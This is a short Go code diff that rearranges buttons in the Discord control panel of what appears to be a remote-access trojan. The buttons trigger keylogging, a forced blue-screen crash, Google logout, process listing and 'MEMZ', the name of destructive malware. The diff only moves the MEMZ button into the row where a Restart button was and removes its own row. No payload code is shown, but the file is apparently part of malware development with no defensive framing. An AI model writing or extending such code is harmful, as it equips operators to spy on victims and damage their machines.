@@ -82,7 +82,7 @@ func ControlPanel() []discordgo.MessageComponent {
 		}},
 		discordgo.ActionsRow{Components: []discordgo.MessageComponent{
 			Button("🚪 Logout Google", discordgo.DangerButton, "btn_google_close"),
-			Button("🔄 Restart", discordgo.DangerButton, "btn_restart"),
+			Button("☠️ MEMZ", discordgo.DangerButton, "btn_memz"),
 			Button("📂 Processes", discordgo.DangerButton, "btn_ps"),
 			Button("💀 BSOD", discordgo.DangerButton, "btn_bsod"),
 		}},
@@ -96,9 +96,6 @@ func ControlPanel() []discordgo.MessageComponent {
 		discordgo.ActionsRow{Components: []discordgo.MessageComponent{
 			Button("▶️ Start Keylog", discordgo.SuccessButton, "btn_keylog_start"),
 			Button("⏹ Stop Keylog", discordgo.SecondaryButton, "btn_keylog_stop"),
-		}},
-		discordgo.ActionsRow{Components: []discordgo.MessageComponent{
-			Button("☠️ MEMZ", discordgo.DangerButton, "btn_memz"),
 		}},
 	}
 }
